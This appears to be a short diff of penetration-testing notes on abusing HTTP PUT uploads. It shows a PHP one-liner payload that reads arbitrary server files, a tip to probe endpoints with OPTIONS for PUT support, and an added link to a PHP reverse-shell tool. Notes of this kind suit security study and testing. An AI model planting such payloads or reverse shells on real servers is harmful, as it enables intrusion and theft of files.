@@ -57,3 +57,5 @@ Content-Length: 49
 <?php echo file_get_contents('/path/to/file'); ?>
 
 can try sending OPTIONS requests to different endpoints to test for any that advertise support for the PUT method
+
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
